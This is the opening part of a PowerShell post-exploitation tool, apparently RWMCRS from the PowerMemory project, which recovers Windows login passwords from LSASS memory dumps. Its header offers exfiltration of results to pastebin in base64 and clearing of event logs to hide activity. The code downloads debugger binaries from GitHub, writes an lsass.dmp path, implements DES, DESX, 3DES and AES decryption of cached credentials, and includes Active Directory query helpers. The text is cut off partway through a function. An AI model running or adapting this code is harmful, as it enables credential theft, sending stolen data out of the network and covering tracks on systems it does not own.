#requires -version 2
<#

*************************************************************

RWMCRS is provided under the 3-clause BSD license below.

*************************************************************

Copyright (c) 2012, Pierre-Alexandre Braeken
All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

    Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
    Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
    The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*************************************************************

.SYNOPSIS         
    RWMCRS : Reveal Windows Memory Credentials from a Root Shell...

.DESCRIPTION
    This tool allows to run RWMC from a command line with parameters. Could be interesting in post exploitation audit mode.

.PARAMETER Relaunched
    Help with local admin detection
    0 = not relaunched

.PARAMETER QueryAD
    Query Active Directory to retrieve rights level of found accounts
    1 = query AD
    2 = not query AD

.PARAMETER Target
    1 = Local
    2 = Remote
    3 = "famous" process .dmp
    4 = VM snapshot .dmp

.PARAMETER ComputerName
    If you target a remote computer and that you selected option 2 for Target parameter, enter the target computer name

.PARAMETER ProcessPath
    If you target a dump of the famous process and that you selected option 3 for Target parameter, enter the "famous" process .dmp Path

.PARAMETER SnapshotVMPath
    If you target a dump of a VM snapshot .dmp and that you selected option 4 for Target parameter, enter the VM snapshot .dmp Path

.PARAMETER Mode    
    3    = Windows 2003
    1    = Win 7 and 2008r2
    132  = Win 7 32 bits
    2    = Win 8 and 2012
    2r2  = Win 10 and 2012r2
    232  = Win 10 32 bits
    8.1  = Win 8.1
    2016 = Windows Server 2016
   
.PARAMETER Exfiltrate
    Give to the script your pastebin dev key to export the result to pastebin in base 64 encoding format

.PARAMETER clearEventLog
    Clean your activity

.NOTES
    Version:        0.1
    Author:         Pierre-Alexandre Braeken
    Creation Date:  2015-11-28

.EXAMPLES

Reveal passwords of the local computer accessed from the root shell 
.\White-Rabbit.ps1 -Target 1

Reveal password of the remote computer "DC1" from the root shell and associate account found with Active Directory 
.\White-Rabbit.ps1 -QueryAD 1 -Target 2 -ComputerName DC1

Reveal password from a Virtual Machine dump and exfiltrate result to pastebin
.\White-Rabbit.ps1 -Target 4 -SnapshotVMPath "d:\DC1.dmp" -Exfiltrate "ae9sdfe2545fb6155d8d8bcsd54t68ef"

#>
Param
    (
        [Parameter(Position = 0)]        
        [Int32]   $Relaunched = 0,
        [Int32]   $QueryAD = 2,
        [Int32]   $Target = 1,
        [String]  $ComputerName = "not",
        [String]  $ProcessPath = "not",
        [String]  $SnapshotVMPath = "not",
        [String]   $Mode = "1",
        [String]  $Exfiltrate = "not",
        [Int32]   $clearEventLog = 2

    )
#---------------------------------------------------------[Initialisations]--------------------------------------------------------
Set-StrictMode -version 2

$windowsSecurity = "C:\windows\security"
$scriptPath = $windowsSecurity 

$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$buffer = "$scriptPath\bufferCommand.txt"
$fullScriptPath = "$scriptPath\bufferCommand.txt" #(Resolve-Path -Path $buffer).Path


$global:partOfADomain = 0
$adFlag = 0
$osArchitecture = ""
$operatingSystem = ""
$osArchitectureHost = ""
$operatingSystemHost = ""
$server = ""
$elevate = 0
$dev_key = $null
$snapshot = $false
$toADD = 0
$hostMode = ""

$baseUrl2r2 = "https://github.com/giMini/PowerMemory/raw/master/RWMCRS/debugger/2r2"
$baseUrlpre2r2 = "https://github.com/giMini/PowerMemory/raw/master/RWMCRS/debugger/pre2r2"
$baseUrlpre2r2vm = "https://github.com/giMini/PowerMemory/raw/master/RWMCRS/debugger/pre2r2vm"
$baseUrlpre2r2vmxp = "https://github.com/giMini/PowerMemory/raw/master/RWMCRS/debugger/pre2r2vm/winxp"

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$scriptName = "Set-Security"
$scriptVersion = "0.4"

if(!(Test-Path $logDirectoryPath)) {
    New-Item $logDirectoryPath -type directory | Out-Null
}

#$logFileName = "Log_" + $launchDate + ".log"
#$logPathName = "$logDirectoryPath\$logFileName"

#$global:streamWriter = New-Object System.IO.StreamWriter $logPathName

#-----------------------------------------------------------[Functions]------------------------------------------------------------
<#
. $loggingFunctions
. $cryptoFunctions
. $DESXFunctions
. $utilsFunctions
. $domainFunctions
. $vipFunctions
. $supportedOSSystemsFunctions
. $obsoleteSystemsFunctions
. $snapshotFunctions
#>

Function Start-Log {    
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][string]$scriptName, [Parameter(Mandatory=$true)][string]$scriptVersion, 
        [Parameter(Mandatory=$true)][string]$streamWriter)
    Process{                  
        $global:streamWriter.WriteLine("================================================================================================")
        $global:streamWriter.WriteLine("[$ScriptName] version [$ScriptVersion] started at $([DateTime]::Now)")
        $global:streamWriter.WriteLine("================================================================================================`n")       
    }
}
 
Function Write-Log {
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][string]$streamWriter, [Parameter(Mandatory=$true)][string]$infoToLog)  
    Process{    
        $global:streamWriter.WriteLine("$infoToLog")
    }
}
 
Function Write-Error {
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][string]$streamWriter, [Parameter(Mandatory=$true)][string]$errorCaught, [Parameter(Mandatory=$true)][boolean]$forceExit)  
    Process{
        $global:streamWriter.WriteLine("Error: [$errorCaught]")        
        if ($forceExit -eq $true){
            #End-Log -streamWriter $global:streamWriter
            break;
        }
    }
}
 
Function End-Log { 
    [CmdletBinding()]  
    Param ([Parameter(Mandatory=$true)][string]$streamWriter)  
    Process{    
        $global:streamWriter.WriteLine("`n================================================================================================")
        $global:streamWriter.WriteLine("Script ended at $([DateTime]::Now)")
        $global:streamWriter.WriteLine("================================================================================================")
  
        $global:streamWriter.Close()   
    }
}

function Get-DecryptTripleDESPassword($password, $key, $initializationVector) {  
    try{
        $arrayPassword = $password -split ', '
        $passwordByte = @()
        foreach($ap in $arrayPassword){
            $passwordByte += [System.Convert]::ToByte($ap,16)     
        }

        $arrayKey = $key -split ', '
        $keyByte = @()
        foreach($ak in $arrayKey){
            $keyByte += [System.Convert]::ToByte($ak,16)        
        }

        $arrayInitializationVector = $initializationVector -split ', '
        $initializationVectorByte = @()
        foreach($aiv in $arrayInitializationVector){
            $initializationVectorByte += [System.Convert]::ToByte($aiv,16)        
        }
 
        $TripleDES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
                
        $TripleDES.IV = $initializationVectorByte
        $TripleDES.Key = $keyByte
        $TripleDES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $TripleDES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $decryptorObject = $TripleDES.CreateDecryptor()
        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($passwordByte, 0 , $passwordByte.Length)

        $TripleDES.Clear()

        return $outBlock
     }
     catch {
        #Write-Error "$error[0]"
    }
}

function Get-DecryptAESPassword($password, $key, $initializationVector) {
    try{

        $arrayPassword = $password -split ', '
        $passwordByte = @()
        foreach($ap in $arrayPassword){
            $passwordByte += [System.Convert]::ToByte($ap,16)     
        }

        $arrayKey = $key -split ', '
        $keyByte = @()
        foreach($ak in $arrayKey){
            $keyByte += [System.Convert]::ToByte($ak,16)        
        }

        $arrayInitializationVector = $initializationVector -split ', '
        $initializationVectorByte = @()
        foreach($aiv in $arrayInitializationVector){
            $initializationVectorByte += [System.Convert]::ToByte($aiv,16)        
        }
        $AESObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                
        $AESObject.IV = $initializationVectorByte
        $AESObject.Key = $keyByte
        $decryptorObject = $AESObject.CreateDecryptor()
        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($passwordByte, 0 , $passwordByte.Length)

        $AESObject.Clear()

        return [System.Text.UnicodeEncoding]::Unicode.GetString($outBlock)
    }
    catch {
        Write-host "$error[0]"
    }
}


function Decode-Base64PasteBin {
    $data = "D:\pasteRetrieved.txt"

    $dataLoaded = (gc $data) -replace '\s', '+' 

    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($dataLoaded)) | Out-File d:\test.txt

    $decodedFile = (get-content d:\test.txt)

    $decodedFile = $decodedFile -replace '= ',"`n"
    $decodedFile = $decodedFile -replace ' =',"`n"
    $decodedFile = $decodedFile -replace 'Password : ',"`nPassword : "
    $decodedFile = $decodedFile -replace 'Login',"`nLogin"

    $decodedFile | out-file d:\test.txt -Encoding utf8

}

$sboxul = New-Object 'object[,]' 8,64
$string = "0x02080800,0x00080000,0x02000002,0x02080802,0x02000000,0x00080802,0x00080002,0x02000002,0x00080802,0x02080800,0x02080000,0x00000802,0x02000802,0x02000000,0x00000000,0x00080002,0x00080000,0x00000002,0x02000800,0x00080800,0x02080802,0x02080000,0x00000802,0x02000800,0x00000002,0x00000800,0x00080800,0x02080002,0x00000800,0x02000802,0x02080002,0x00000000,0x00000000,0x02080802,0x02000800,0x00080002,0x02080800,0x00080000,0x00000802,0x02000800,0x02080002,0x00000800,0x00080800,0x02000002,0x00080802,0x00000002,0x02000002,0x02080000,0x02080802,0x00080800,0x02080000,0x02000802,0x02000000,0x00000802,0x00080002,0x00000000,0x00080000,0x02000000,0x02000802,0x02080800,0x00000002,0x02080002,0x00000800,0x00080802"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[0,$j] = $s
    $j++
}

$string = "0x40108010,0x00000000,0x00108000,0x40100000,0x40000010,0x00008010,0x40008000,0x00108000,0x00008000,0x40100010,0x00000010,0x40008000,0x00100010,0x40108000,0x40100000,0x00000010,0x00100000,0x40008010,0x40100010,0x00008000,0x00108010,0x40000000,0x00000000,0x00100010,0x40008010,0x00108010,0x40108000,0x40000010,0x40000000,0x00100000,0x00008010,0x40108010,0x00100010,0x40108000,0x40008000,0x00108010,0x40108010,0x00100010,0x40000010,0x00000000,0x40000000,0x00008010,0x00100000,0x40100010,0x00008000,0x40000000,0x00108010,0x40008010,0x40108000,0x00008000,0x00000000,0x40000010,0x00000010,0x40108010,0x00108000,0x40100000,0x40100010,0x00100000,0x00008010,0x40008000,0x40008010,0x00000010,0x40100000,0x00108000"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[1,$j] = $s
    $j++
}
$string = "0x04000001,0x04040100,0x00000100,0x04000101,0x00040001,0x04000000,0x04000101,0x00040100,0x04000100,0x00040000,0x04040000,0x00000001,0x04040101,0x00000101,0x00000001,0x04040001,0x00000000,0x00040001,0x04040100,0x00000100,0x00000101,0x04040101,0x00040000,0x04000001,0x04040001,0x04000100,0x00040101,0x04040000,0x00040100,0x00000000,0x04000000,0x00040101,0x04040100,0x00000100,0x00000001,0x00040000,0x00000101,0x00040001,0x04040000,0x04000101,0x00000000,0x04040100,0x00040100,0x04040001,0x00040001,0x04000000,0x04040101,0x00000001,0x00040101,0x04000001,0x04000000,0x04040101,0x00040000,0x04000100,0x04000101,0x00040100,0x04000100,0x00000000,0x04040001,0x00000101,0x04000001,0x00040101,0x00000100,0x04040000"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[2,$j] = $s
    $j++
}
$string = "0x00401008,0x10001000,0x00000008,0x10401008,0x00000000,0x10400000,0x10001008,0x00400008,0x10401000,0x10000008,0x10000000,0x00001008,0x10000008,0x00401008,0x00400000,0x10000000,0x10400008,0x00401000,0x00001000,0x00000008,0x00401000,0x10001008,0x10400000,0x00001000,0x00001008,0x00000000,0x00400008,0x10401000,0x10001000,0x10400008,0x10401008,0x00400000,0x10400008,0x00001008,0x00400000,0x10000008,0x00401000,0x10001000,0x00000008,0x10400000,0x10001008,0x00000000,0x00001000,0x00400008,0x00000000,0x10400008,0x10401000,0x00001000,0x10000000,0x10401008,0x00401008,0x00400000,0x10401008,0x00000008,0x10001000,0x00401008,0x00400008,0x00401000,0x10400000,0x10001008,0x00001008,0x10000000,0x10000008,0x10401000"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[3,$j] = $s
    $j++
}
$string = "0x08000000,0x00010000,0x00000400,0x08010420,0x08010020,0x08000400,0x00010420,0x08010000,0x00010000,0x00000020,0x08000020,0x00010400,0x08000420,0x08010020,0x08010400,0x00000000,0x00010400,0x08000000,0x00010020,0x00000420,0x08000400,0x00010420,0x00000000,0x08000020,0x00000020,0x08000420,0x08010420,0x00010020,0x08010000,0x00000400,0x00000420,0x08010400,0x08010400,0x08000420,0x00010020,0x08010000,0x00010000,0x00000020,0x08000020,0x08000400,0x08000000,0x00010400,0x08010420,0x00000000,0x00010420,0x08000000,0x00000400,0x00010020,0x08000420,0x00000400,0x00000000,0x08010420,0x08010020,0x08010400,0x00000420,0x00010000,0x00010400,0x08010020,0x08000400,0x00000420,0x00000020,0x00010420,0x08010000,0x08000020"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[4,$j] = $s
    $j++
}
$string = "0x80000040,0x00200040,0x00000000,0x80202000,0x00200040,0x00002000,0x80002040,0x00200000,0x00002040,0x80202040,0x00202000,0x80000000,0x80002000,0x80000040,0x80200000,0x00202040,0x00200000,0x80002040,0x80200040,0x00000000,0x00002000,0x00000040,0x80202000,0x80200040,0x80202040,0x80200000,0x80000000,0x00002040,0x00000040,0x00202000,0x00202040,0x80002000,0x00002040,0x80000000,0x80002000,0x00202040,0x80202000,0x00200040,0x00000000,0x80002000,0x80000000,0x00002000,0x80200040,0x00200000,0x00200040,0x80202040,0x00202000,0x00000040,0x80202040,0x00202000,0x00200000,0x80002040,0x80000040,0x80200000,0x00202040,0x00000000,0x00002000,0x80000040,0x80002040,0x80202000,0x80200000,0x00002040,0x00000040,0x80200040"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[5,$j] = $s
    $j++
}
$string = "0x00004000,0x00000200,0x01000200,0x01000004,0x01004204,0x00004004,0x00004200,0x00000000,0x01000000,0x01000204,0x00000204,0x01004000,0x00000004,0x01004200,0x01004000,0x00000204,0x01000204,0x00004000,0x00004004,0x01004204,0x00000000,0x01000200,0x01000004,0x00004200,0x01004004,0x00004204,0x01004200,0x00000004,0x00004204,0x01004004,0x00000200,0x01000000,0x00004204,0x01004000,0x01004004,0x00000204,0x00004000,0x00000200,0x01000000,0x01004004,0x01000204,0x00004204,0x00004200,0x00000000,0x00000200,0x01000004,0x00000004,0x01000200,0x00000000,0x01000204,0x01000200,0x00004200,0x00000204,0x00004000,0x01004204,0x01000000,0x01004200,0x00000004,0x00004004,0x01004204,0x01000004,0x01004200,0x01004000,0x00004004"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[6,$j] = $s
    $j++
}
$string = "0x20800080,0x20820000,0x00020080,0x00000000,0x20020000,0x00800080,0x20800000,0x20820080,0x00000080,0x20000000,0x00820000,0x00020080,0x00820080,0x20020080,0x20000080,0x20800000,0x00020000,0x00820080,0x00800080,0x20020000,0x20820080,0x20000080,0x00000000,0x00820000,0x20000000,0x00800000,0x20020080,0x20800080,0x00800000,0x00020000,0x20820000,0x00000080,0x00800000,0x00020000,0x20000080,0x20820080,0x00020080,0x20000000,0x00000000,0x00820000,0x20800080,0x20020080,0x20020000,0x00800080,0x20820000,0x00000080,0x00800080,0x20020000,0x20820080,0x00800000,0x20800000,0x20000080,0x00820000,0x00020080,0x20020080,0x20800000,0x00000080,0x20820000,0x00820080,0x00000000,0x20000000,0x20800080,0x00020000,0x00820080"
$string = $string -split ","
$j=0
foreach($s in $string){
    $sboxul[7,$j] = $s
    $j++
}

function rol ($val, $r_bits, $max_bits) {        
    return (($val -shl ($r_bits % $max_bits)) -band ([math]::Pow(2,$max_bits)-1) -bor ($val -band ([math]::Pow(2,$max_bits)-1)) -shr ($max_bits-($r_bits % $max_bits)))        
}
   
function ror ($val, $r_bits, $max_bits) {       
    return ((($val -band ([math]::Pow(2,$max_bits)-1)) -shr $r_bits % $max_bits) -bor ($val -shl ($max_bits-($r_bits % $max_bits)) -band ([math]::Pow(2,$max_bits)-1)))        
}

function loop($des_key, $dst, $src, $ecx, $round){
    $eax = $des_key.Substring($round*8,4)
    $edx = $des_key.Substring($round*8+4,4)
    $eax = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($eax),0);
    $edx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($edx),0);
    $ebx = 0
    $eax = $eax -bxor $src
    $edx = $edx -bxor $src
    $eax = $eax -band "0x0FCFCFCFC"
    $edx = $edx -band "0x0CFCFCFCF"
    $ebx = ($ebx -band "0xFFFFFF00") -bor ($eax -band "0x000000FF")
    $ecx = ($ecx -band "0xFFFFFF00") -bor (($eax -band "0x0000FF00") -shr 8)
    $edx = ror $edx 4 32
    $ebp = [Convert]::ToInt64(($sboxul[0,($ebx -shr 2)]),16)
    $ebx = ($ebx -band "0xFFFFFF00") -bor ($edx -band "0x000000FF")
    $dst = $dst -bxor $ebp
    $ebp = [Convert]::ToInt64(($sboxul[2,($ecx -shr 2)]),16)
    $dst = $dst -bxor $ebp
    $ecx = ($ecx -band "0xFFFFFF00") -bor (($edx -band "0x0000FF00") -shr 8)
    $eax = $eax -shr "0x10"
    $ebp = [Convert]::ToInt64(($sboxul[1,($ebx -shr 2)]),16)
    $dst = $dst -bxor $ebp
    $ebx = ($ebx -band "0xFFFFFF00") -bor (($eax -band "0x0000FF00") -shr 8)
    $edx = $edx -shr "0x10"
    $ebp = [Convert]::ToInt64(($sboxul[3,($ecx -shr 2)]),16)
    $dst = $dst -bxor $ebp
    $ecx = ($ecx -band "0xFFFFFF00") -bor (($edx -band "0x0000FF00") -shr 8)
    $eax = $eax -band "0xFF"
    $edx = $edx -band "0xFF"
    $ebx = [Convert]::ToInt64(($sboxul[6,($ebx -shr 2)]),16)
    $dst = $dst -bxor $ebx
    $ebx = [Convert]::ToInt64(($sboxul[7,($ecx -shr 2)]),16)
    $dst = $dst -bxor $ebx
    $ebx = [Convert]::ToInt64(($sboxul[4,($eax -shr 2)]),16)
    $dst = $dst -bxor $ebx
    $ebx = [Convert]::ToInt64(($sboxul[5,($edx -shr 2)]),16)
    $dst = $dst -bxor $ebx
    return $dst,$ecx    
}

function decrypt($des_key128,$encrypted){
    $esi = $encrypted    
    $eax = $esi.Substring(0,4)
    $eax = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($eax),0);    
    $edi = $esi.Substring(4)
    $edi = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($edi),0);
    $eax = rol $eax "4" 32
    $esi = $eax
    $eax = $eax -bxor $edi
    $eax = $eax -band "0x0F0F0F0F0"
    $esi = $esi -bxor $eax
    $edi = $edi -bxor $eax
    $edi = rol $edi "0x14" 32
    $eax = $edi
    $edi = $edi -bxor $esi
    $edi = $edi -band "0x0FFF0000F"
    $eax = $eax -bxor $edi
    $esi = $esi -bxor $edi
    $eax = rol $eax "0x0e" 32
    $edi = $eax
    $eax = $eax -bxor $esi
    $eax = $eax -band "0x33333333"
    $edi = $edi -bxor $eax
    $esi = $esi -bxor $eax
    $esi = rol $esi "0x16" 32
    $eax = $esi
    $esi = $esi -bxor $edi
    $esi = $esi -band "0x3FC03FC"
    $eax = $eax -bxor $esi
    $edi = $edi -bxor $esi
    $eax = rol $eax "0x9" 32
    $esi = $eax
    $eax = $eax -bxor $edi
    $eax = $eax -band "0x0AAAAAAAA"
    $esi = $esi -bxor $eax    
    $edi = $edi -bxor $eax
    $edi = rol $edi "0x1" 32
    $ecx = 0
    $round = 15
    while($round -gt 0) { 
        $edi, $ecx = loop $des_key128 $edi $esi $ecx $round
        $ind = $round - 1
        $esi, $ecx = loop $des_key128 $esi $edi $ecx $ind  
        $round = $round - 2
    }    
    $esi = ror $esi 1 32
    $eax = $edi
    $edi = $edi -bxor $esi
    $edi = $edi -band "0x0AAAAAAAA"
    $eax = $eax -bxor $edi
    $esi = $esi -bxor $edi
    $eax = rol $eax "0x17" 32
    $edi = $eax
    $eax = $eax -bxor $esi
    $eax = $eax -band "0x3FC03FC"
    $edi = $edi -bxor $eax
    $esi = $esi -bxor $eax
    $edi = rol $edi "0x0A" 32
    $eax = $edi
    $edi = $edi -bxor $esi
    $edi = $edi -band "0x33333333"
    $eax = $eax -bxor $edi
    $esi = $esi -bxor $edi
    $esi = rol $esi "0x12" 32
    $edi = $esi
    $esi = $esi -bxor $eax
    $esi = $esi -band "0x0FFF0000F"
    $edi = $edi -bxor $esi
    $eax = $eax -bxor $esi
    $edi = rol $edi "0x0C" 32
    $esi = $edi
    $edi = $edi -bxor $eax
    $edi = $edi -band "0x0F0F0F0F0"
    $esi = $esi -bxor $edi
    $eax = $eax -bxor $edi
    $eax = ror $eax 4 32
    $encoding = [System.Text.Encoding]::GetEncoding("windows-1252")
    $eax = $encoding.GetString([BitConverter]::GetBytes($eax))
    $esi = $encoding.GetString([BitConverter]::GetBytes($esi))
    return $eax,$esi
}
function XP_DESX($desx_key,$encrypted){
    $eax = $encrypted.Substring(0,4)
    $esi = $encrypted.Substring(4,4)
    $eax = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($eax),0);
    $esi = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($esi),0);
    $ecx = $desx_key.Substring(8,4)
    $edx = $desx_key.Substring(12,4)
    $ecx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($ecx),0);
    $edx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($edx),0);
    $ecx = $ecx -bxor $eax
    $edx = $edx -bxor $esi    
    $encoding = [System.Text.Encoding]::GetEncoding("windows-1252")
    $ecx = $encoding.GetString([BitConverter]::GetBytes($ecx))
    $edx = $encoding.GetString([BitConverter]::GetBytes($edx))
    $enc_64 = $ecx + $edx
    $des_key128 = $desx_key.Substring(16,128)
    $decrypted,$decrypted2 = decrypt $des_key128 $enc_64    
    $ecx = $desx_key.Substring(0,4)
    $ebx = $desx_key.Substring(4,4)
    $ecx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($ecx),0);
    $ebx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($ebx),0);
    $edx = $decrypted    
    $eax = $decrypted2    
    $edx = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($edx),0);
    $eax = [BitConverter]::ToUInt32([Text.Encoding]::Default.GetBytes($eax),0);    
    $edx = $edx -bxor $ecx
    $eax = $eax -bxor $ebx   
    $encoding = [System.Text.Encoding]::GetEncoding("windows-1252")
    $edx = $encoding.GetString([BitConverter]::GetBytes($edx))
    $eax = $encoding.GetString([BitConverter]::GetBytes($eax))    
    return $edx,$eax
}
function XP_CBC_DESX($encrypted, $desx_key, $feedback) {
    $decrypted,$decrypted2 = XP_DESX $desx_key $encrypted
    $decrypted = $decrypted + $decrypted2
    $decrypted_temp = [BitConverter]::ToUInt64([Text.Encoding]::Default.GetBytes($decrypted),0);
    $decrypted_temp2 = [BitConverter]::ToUInt64([Text.Encoding]::Default.GetBytes($feedback),0);
    $decrypted_temp = $decrypted_temp -bxor $decrypted_temp2    
    $decrypted = [BitConverter]::GetBytes($decrypted_temp);
    $feedback = $encrypted
    return $decrypted,$feedback

}
function Get-OldDec ($DESXKeyHex, $g_Feedback, $cipherToDecrypt) {
    $desx_key = $DESXKeyHex
    $feedback = $g_Feedback
    $measureObject = $cipherToDecrypt | Measure-Object -Character
    $count = $measureObject.Characters
    $measureObject = $g_Feedback | Measure-Object -Character
    $countFeed = $measureObject.Characters    
    $decrypted = ''            
    $count = $count -shr 3
    $i = 0    
    while($i -lt $count) {         
        $decrypted8, $feedback = XP_CBC_DESX $cipherToDecrypt.Substring($i*8,8) $desx_key $feedback
        $decrypted += $decrypted8
        $i++
    }
    return $decrypted    
}

# &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
# Function Name 'Import-Modules' - Import module if not loaded
# ________________________________________________________________________
function Import-Modules {
    Begin{
        #Write-Log -streamWriter $global:streamWriter -infoToLog "Active Directory module import"
    }
    Process{
        Try{
            if(!(get-module activedirectory)) {
		        Write-Host "Importing module activedirectory..." -ForegroundColor white -BackgroundColor Blue       
		        Import-Module activedirectory 
	        }  
        }
    
        Catch{
            #Write-Error -streamWriter $global:streamWriter -errorCaught $_.Exception -forceExit $True
            Break
        }
    }  
    End{
        If($?){
            #Write-Log -streamWriter $global:streamWriter -infoToLog "Completed Successfully."
            #Write-Log -streamWriter $global:streamWriter -infoToLog " "
        }
    }         
}
# &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
# Function Name 'Get-DistinguishedNameFromFQDN' - Convert domain name into distinguished name
# ________________________________________________________________________
function Get-DistinguishedNameFromFQDN {
	param([string]$domainFullQualifiedDomain=(throw "You must specify the domain Full Qualified Name !"))
    Begin{
        Write-Verbose "Get distinguished name from domain name"
    }
    Process{
        Try{
            $distinguishedName = "" 
	        $obj = $domainFullQualifiedDomain.Replace(',','\,').Split('/')
	        $obj[0].split(".") | ForEach-Object { $distinguishedName += ",DC=" + $_}
	        $distinguishedName = $distinguishedName.Substring(1)
            Write-Verbose "Domain name is $domainFullQualifiedDomain, distinguished name is $distinguishedName"
	        return $distinguishedName
        }    
        Catch{
            Write-Error -streamWriter $global:streamWriter -errorCaught $_.Exception -forceExit $True
            Break
        }
    }  
    End{
        If($?){
            Write-Verbose "Completed Successfully."            
        }
    }  	
}

function Get-ForestDomain($currentDomain) {   
    $forest = Get-ADForest -Identity $currentDomain
    $domain = Get-ADDomain -Identity $currentDomain    

    # Retrieve in an object the forest and domain user context
    $forestDomain = New-Object PSObject -Property @{        
		forest = $forest
	    domain = $domain
	}  
	
    return $forestDomain
}

function Get-FSMOPlacement($domainName) {   
    #Import-Modules                         
    
    $forestDomain = Get-ForestDomain $domainName

    $forest = $forestDomain.forest
    $domain = $forestDomain.domain

    #-ForegroundColor white -BackgroundColor Blue   

	$fsmoPlacement = New-Object PSObject -Property @{        
		"SchemaMaster" = $forest.SchemaMaster
		"DomainNamingMaster" = $forest.DomainNamingMaster
		"RIDMaster" = $domain.RIDMaster
		"PDCEmulator" = $domain.PDCEmulator		
		"InfrastructureMaster" = $domain.InfrastructureMaster		
	}    

	return $fsmoPlacement            
 }

function Get-AdInfos($currentDomain) {          
    #Import-Modules     			                    

    $forestDomain = Get-ForestDomain $currentDomain

    $forest = $forestDomain.forest
    $domain = $forestDomain.domain

    Write-Host $forest

    #-ForegroundColor white -BackgroundColor Blue       

	$adInfos = New-Object PSObject -Property @{   
        "ForestName" = $forest.Name     
        "RootDomain" = $forest.RootDomain
		"ForestLevel" = $forest.ForestMode
    	"Domainlevel" = $domain.DomainMode
        "Sites" = $forest.Sites
        "Domains" = $forest.Domains
        "GlobalCatalogs" = $forest.GlobalCatalogs        
        "RODC" = $domain.ReadOnlyReplicaDirectoryServers
        "DC" = $domain.ReplicaDirectoryServers
        "SPNSuffixes" = $domain.SPNSuffixes
        "UPNSuffixes" = $domain.UPNSuffixes
        "ApplicationPartitions" = $domain.ApplicationPartitions
        "PartitionsContainer" = $domain.PartitionsContainer
        "CrossForestReferences" = $domain.CrossForestReferences
	}    

	return $adInfos            
 }
<#
function Get-DistinguishedNameFromFQDN {
	param([string]$domainFullQualifiedDomain=(throw "Vous devez indiquer le Full Qualified Name du Domaine !"))
	$distinguishedName = "" 
	$obj = $domainFullQualifiedDomain.Replace(',','\,').Split('/')
	$obj[0].split(".") | ForEach-Object { $distinguishedName += ",DC=" + $_}
	$distinguishedName = $distinguishedName.Substring(1)
	return $distinguishedName
}#>
function Set-LDAPQuery ($LDAPObject, $filter, $propertiesToLoad, $scope, $pageSize) {
<#
.SYNOPSIS
    Set a LDAP query
    Author: Pierre-Alexandre Braeken (@pabraeken)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None 

.DESCRIPTION
    Set-LDAPQuery allows for the configuration of a LDAP query. The output of this function is an LDAP object. 

.PARAMETER LDAPObject
    DirectorySearcher parameter that let you specify an LDAP object bound on a domain controller and a domain distinguished name.

.PARAMETER filter

.PARAMETER propertiesToLoad

.PARAMETER scope

.PARAMETER pageSize

.EXAMPLE
    C:\PS> Set-LDAPQuery $LDAPObject "(servicePrincipalName=MSSQL*)" "name","distinguishedName,objectCategory,servicePrincipalName" "subtree" "1000"
#>
    $LDAPObject = New-Object System.DirectoryServices.DirectorySearcher([ADSI]("LDAP://$domainControllerToQuery/"+ $domainDistinguishedName))
    $LDAPObject.Filter = $filter
    foreach($property in $propertiesToLoad){
        $LDAPObject.PropertiesToLoad.Add($property) | Out-Null
    }
    $LDAPObject.SearchScope = $scope
    $LDAPObject.PageSize = $pageSize
    return $LDAPObject 
}

function Get-Nesting ($group, $parents) { 
